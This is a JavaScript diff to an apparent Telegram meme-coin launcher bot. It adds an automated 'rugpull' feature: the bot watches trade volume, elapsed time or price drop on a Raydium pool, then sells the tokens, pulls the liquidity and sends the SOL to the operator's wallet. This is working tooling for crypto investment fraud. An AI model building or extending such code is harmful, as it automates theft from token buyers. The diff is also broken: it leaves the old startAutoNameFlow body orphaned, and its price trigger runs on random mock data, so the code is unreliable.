@@ -853,7 +853,404 @@ Let's create an AI-powered meme coin with trending data!
     });
 }
 
-function startAutoNameFlow(chatId, userId) {
+function startAutoRugFlow(chatId, params) {
+    const createdPools = raydiumManager.getAllPools();
+    
+    if (createdPools.length === 0) {
+        bot.sendMessage(chatId, `
+❌ *No Pools Found*
+
+You need to create a pool first before setting up auto-rugpull.
+
+Steps:
+1. Use /launch to create a token
+2. Use /create_pool to create a Raydium pool
+3. Then set up auto-rugpull monitoring!
+        `, { parse_mode: 'Markdown' });
+        return;
+    }
+
+    if (botState.autoRugMonitor.active) {
+        const tokenInfo = tokenManager.getToken(botState.autoRugMonitor.tokenMint);
+        bot.sendMessage(chatId, `
+⚠️ *Auto-Rugpull Already Active*
+
+Currently monitoring: ${tokenInfo ? tokenInfo.name : 'Unknown'} (${tokenInfo ? tokenInfo.symbol : 'TOKEN'})
+
+Use /cancel_auto_rug to stop current monitoring first.
+        `, { parse_mode: 'Markdown' });
+        return;
+    }
+
+    if (params) {
+        // Parse parameters from command
+        try {
+            const parts = params.split(/\s+/);
+            if (parts.length !== 3) {
+                throw new Error('Invalid parameter count');
+            }
+            
+            const volume = parseFloat(parts[0]);
+            const timeMinutes = parseInt(parts[1]);
+            const dropPercent = parseFloat(parts[2]);
+            
+            if (isNaN(volume) || isNaN(timeMinutes) || isNaN(dropPercent)) {
+                throw new Error('Invalid parameter values');
+            }
+            
+            // If only one pool, start monitoring directly
+            if (createdPools.length === 1) {
+                startAutoRugMonitoring(chatId, createdPools[0].tokenMint, {
+                    volume: volume,
+                    timeMinutes: timeMinutes,
+                    dropPercent: dropPercent
+                });
+            } else {
+                // Multiple pools - show selection with parsed params
+                showPoolSelectionForAutoRug(chatId, { volume, timeMinutes, dropPercent });
+            }
+        } catch (error) {
+            bot.sendMessage(chatId, `
+❌ *Invalid Parameters*
+
+Usage: \`/auto_rug [volume] [time_minutes] [drop_percent]\`
+
+Example: \`/auto_rug 1000 30 20\`
+- Volume: 1000 (threshold trading volume)
+- Time: 30 minutes (max time before rugpull)
+- Drop: 20% (price drop percentage trigger)
+
+Or use /auto_rug without parameters for interactive setup.
+            `, { parse_mode: 'Markdown' });
+        }
+    } else {
+        // Interactive mode
+        showAutoRugSetup(chatId);
+    }
+}
+
+function showAutoRugSetup(chatId) {
+    const message = `
+🔴 *Auto-Rugpull Setup* - Advanced Feature
+
+Set up automated rugpull triggers based on conditions:
+
+**📊 Volume Trigger:** Execute when trading volume reaches threshold
+**⏰ Time Trigger:** Execute after specified time duration  
+**📉 Drop Trigger:** Execute when price drops by percentage
+
+**Example Conditions:**
+• Volume ≥ 5000 trades → Immediate rugpull
+• Time ≥ 60 minutes → Scheduled rugpull
+• Price drop ≥ 30% → Emergency rugpull
+
+Choose setup method:
+    `;
+
+    bot.sendMessage(chatId, message, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '⚡ Quick Setup', callback_data: 'auto_rug_quick' },
+                    { text: '🔧 Custom Setup', callback_data: 'auto_rug_custom' }
+                ],
+                [
+                    { text: '❌ Cancel', callback_data: 'cancel_auto_rug' }
+                ]
+            ]
+        }
+    });
+}
+
+function showPoolSelectionForAutoRug(chatId, conditions) {
+    const createdPools = raydiumManager.getAllPools();
+    
+    const poolButtons = createdPools.map(pool => {
+        const tokenInfo = tokenManager.getToken(pool.tokenMint);
+        return [{
+            text: `🔴 ${tokenInfo ? tokenInfo.name : 'Unknown'} (${tokenInfo ? tokenInfo.symbol : 'TOKEN'})`,
+            callback_data: `auto_rug_pool_${pool.tokenMint}_${conditions.volume}_${conditions.timeMinutes}_${conditions.dropPercent}`
+        }];
+    });
+    
+    bot.sendMessage(chatId, `
+🔴 *Select Pool for Auto-Rugpull*
+
+**Conditions:**
+📊 Volume Trigger: ≥${conditions.volume} trades
+⏰ Time Trigger: ${conditions.timeMinutes} minutes
+📉 Drop Trigger: ≥${conditions.dropPercent}% price drop
+
+Choose which pool to monitor:
+    `, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                ...poolButtons,
+                [{ text: '❌ Cancel', callback_data: 'cancel_auto_rug' }]
+            ]
+        }
+    });
+}
+
+function startAutoRugMonitoring(chatId, tokenMint, conditions) {
+    const tokenInfo = tokenManager.getToken(tokenMint);
+    if (!tokenInfo) {
+        bot.sendMessage(chatId, '❌ Token not found');
+        return;
+    }
+
+    // Stop any existing monitoring
+    if (botState.autoRugMonitor.intervalId) {
+        clearInterval(botState.autoRugMonitor.intervalId);
+    }
+
+    // Set up monitoring
+    botState.autoRugMonitor = {
+        active: true,
+        conditions: conditions,
+        startTime: new Date(),
+        chatId: chatId,
+        tokenMint: tokenMint,
+        initialStats: {
+            volume: 0,
+            price: 0,
+            startPrice: 0
+        }
+    };
+
+    // Start monitoring loop (every 60 seconds)
+    botState.autoRugMonitor.intervalId = setInterval(() => {
+        checkAutoRugConditions();
+    }, 60000);
+
+    bot.sendMessage(chatId, `
+🔴 *Auto-Rugpull Monitoring Started!*
+
+🪙 **Token:** ${tokenInfo.name} (${tokenInfo.symbol})
+📊 **Volume Trigger:** ≥${conditions.volume} trades
+⏰ **Time Trigger:** ${conditions.timeMinutes} minutes
+📉 **Drop Trigger:** ≥${conditions.dropPercent}% price drop
+
+⚠️ **Monitoring every 60 seconds**
+🤖 **Automatic rugpull when ANY condition is met**
+
+**Current Status:**
+✅ Monitoring active
+⏰ Started: ${new Date().toLocaleTimeString()}
+🔄 Next check in 60 seconds
+
+Use /cancel_auto_rug to stop monitoring
+    `, { 
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '❌ Cancel Auto-Rug', callback_data: 'cancel_auto_rug' },
+                    { text: '📊 Check Status', callback_data: 'auto_rug_status' }
+                ]
+            ]
+        }
+    });
+
+    console.log('🔴 Auto-rugpull monitoring started for:', tokenInfo.name);
+    console.log('📊 Conditions:', conditions);
+}
+
+async function checkAutoRugConditions() {
+    if (!botState.autoRugMonitor.active) {
+        return;
+    }
+
+    try {
+        const { conditions, startTime, chatId, tokenMint } = botState.autoRugMonitor;
+        const tokenInfo = tokenManager.getToken(tokenMint);
+        
+        console.log('🔍 Checking auto-rug conditions for:', tokenInfo?.name || 'Unknown');
+        
+        // Get current stats
+        const tradingStats = realTradingManager.getTradingStatus();
+        const currentTime = new Date();
+        const elapsedMinutes = Math.floor((currentTime - startTime) / 60000);
+        
+        // Mock volume and price data (replace with real data sources)
+        const currentVolume = tradingStats.stats?.totalTrades || 0;
+        const mockPriceData = await getMockPriceData(tokenMint);
+        
+        console.log(`📊 Current volume: ${currentVolume}, Time: ${elapsedMinutes}min, Price change: ${mockPriceData.changePercent}%`);
+        
+        let triggerReason = null;
+        
+        // Check volume condition
+        if (currentVolume >= conditions.volume) {
+            triggerReason = `Volume threshold reached: ${currentVolume} ≥ ${conditions.volume}`;
+        }
+        
+        // Check time condition
+        if (elapsedMinutes >= conditions.timeMinutes) {
+            triggerReason = `Time limit reached: ${elapsedMinutes} ≥ ${conditions.timeMinutes} minutes`;
+        }
+        
+        // Check price drop condition
+        if (mockPriceData.changePercent <= -conditions.dropPercent) {
+            triggerReason = `Price drop triggered: ${Math.abs(mockPriceData.changePercent)}% ≥ ${conditions.dropPercent}%`;
+        }
+        
+        if (triggerReason) {
+            console.log('🚨 Auto-rug triggered:', triggerReason);
+            
+            // Stop monitoring
+            botState.autoRugMonitor.active = false;
+            clearInterval(botState.autoRugMonitor.intervalId);
+            
+            // Send trigger notification
+            bot.sendMessage(chatId, `
+🚨 *AUTO-RUGPULL TRIGGERED!*
+
+**Trigger Reason:** ${triggerReason}
+**Token:** ${tokenInfo?.name || 'Unknown'} (${tokenInfo?.symbol || 'TOKEN'})
+
+🔄 **Executing automated rugpull...**
+This may take 60-120 seconds...
+            `, { parse_mode: 'Markdown' });
+            
+            // Execute rugpull
+            await executeAutoRugpull(chatId, tokenMint, triggerReason);
+        } else {
+            // Send periodic status update (every 5 checks = 5 minutes)
+            const checkCount = Math.floor(elapsedMinutes);
+            if (checkCount > 0 && checkCount % 5 === 0) {
+                bot.sendMessage(chatId, `
+🔍 *Auto-Rug Status Update*
+
+⏰ **Monitoring:** ${elapsedMinutes}/${conditions.timeMinutes} minutes
+📊 **Volume:** ${currentVolume}/${conditions.volume} trades
+📉 **Price Change:** ${mockPriceData.changePercent.toFixed(2)}%/${conditions.dropPercent}%
+
+✅ Still monitoring... Next check in 60s
+                `, { parse_mode: 'Markdown' });
+            }
+        }
+        
+    } catch (error) {
+        console.error('❌ Auto-rug monitoring error:', error);
+        
+        // Stop monitoring on error
+        botState.autoRugMonitor.active = false;
+        if (botState.autoRugMonitor.intervalId) {
+            clearInterval(botState.autoRugMonitor.intervalId);
+        }
+        
+        bot.sendMessage(botState.autoRugMonitor.chatId, `
+❌ *Auto-Rugpull Monitoring Error*
+
+Monitoring stopped due to error: ${error.message}
+
+Please restart with /auto_rug if needed.
+        `, { parse_mode: 'Markdown' });
+    }
+}
+
+async function getMockPriceData(tokenMint) {
+    // Mock price data - replace with real price feed
+    // This would typically call Raydium/Jupiter APIs for real price data
+    const randomChange = (Math.random() - 0.5) * 40; // -20% to +20% random change
+    
+    return {
+        currentPrice: 0.001 + (Math.random() * 0.002),
+        changePercent: randomChange,
+        volume24h: Math.floor(Math.random() * 10000),
+        lastUpdate: new Date()
+    };
+}
+
+async function executeAutoRugpull(chatId, tokenMint, triggerReason) {
+    try {
+        console.log('🔴 Executing automated rugpull for:', tokenMint);
+        
+        // Use existing rugpull functionality
+        const result = await realTradingManager.executeRugpull(tokenMint);
+        const tokenInfo = tokenManager.getToken(tokenMint);
+        
+        if (result.success) {
+            bot.sendMessage(chatId, `
+🔴 *AUTO-RUGPULL EXECUTED!* ⚡ AUTOMATED
+
+**Trigger:** ${triggerReason}
+🪙 **Token:** ${tokenInfo?.name || 'Unknown'} (${tokenInfo?.symbol || 'TOKEN'})
+💰 **Tokens Sold:** ${result.totalTokensSold?.toFixed(2) || '0'} ${tokenInfo?.symbol || 'TOKEN'}
+💸 **SOL Recovered:** ${result.totalSOLRecovered?.toFixed(4) || '0'} SOL
+🏊 **Liquidity Removed:** ${result.liquidityRemoved ? '✅' : '❌'}
+📊 **Wallet Sales:** ${result.tradingWalletSales || '0'}
+
+💰 **All SOL returned to Wallet 1**
+🤖 **Automated rugpull complete!**
+
+*This was executed automatically based on your conditions.*
+            `, { 
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '💰 Check Wallet 1 Balance', callback_data: 'show_wallets' }]
+                    ]
+                }
+            });
+        } else {
+            bot.sendMessage(chatId, `
+❌ *Auto-Rugpull Failed*
+
+**Trigger:** ${triggerReason}  
+**Error:** ${result.error}
+
+Manual intervention may be required.
+            `, { parse_mode: 'Markdown' });
+        }
+        
+    } catch (error) {
+        console.error('❌ Auto-rugpull execution error:', error);
+        bot.sendMessage(chatId, `
+❌ *Auto-Rugpull Execution Failed*
+
+**Trigger:** ${triggerReason}
+**Error:** ${error.message}
+
+Please check manually with /rugpull
+        `, { parse_mode: 'Markdown' });
+    }
+}
+
+function cancelAutoRug(chatId) {
+    if (!botState.autoRugMonitor.active) {
+        bot.sendMessage(chatId, `
+💡 *No Active Auto-Rugpull*
+
+Auto-rugpull monitoring is not currently active.
+
+Use /auto_rug to set up conditional rugpull monitoring.
+        `, { parse_mode: 'Markdown' });
+        return;
+    }
+
+    const tokenInfo = tokenManager.getToken(botState.autoRugMonitor.tokenMint);
+    const elapsedMinutes = Math.floor((new Date() - botState.autoRugMonitor.startTime) / 60000);
+    
+    // Stop monitoring
+    clearInterval(botState.autoRugMonitor.intervalId);
+    botState.autoRugMonitor.active = false;
+    
+    bot.sendMessage(chatId, `
+❌ *Auto-Rugpull Cancelled*
+
+**Token:** ${tokenInfo?.name || 'Unknown'} (${tokenInfo?.symbol || 'TOKEN'})
+**Monitoring Duration:** ${elapsedMinutes} minutes
+**Status:** Monitoring stopped
+
+You can restart monitoring with /auto_rug anytime.
+    `, { parse_mode: 'Markdown' });
+    
+    console.log('❌ Auto-rugpull monitoring cancelled by user');
+}
     // Initialize auto-name session
     botState.autoBrandSessions.set(userId, {
         step: 'waiting_for_name_theme',
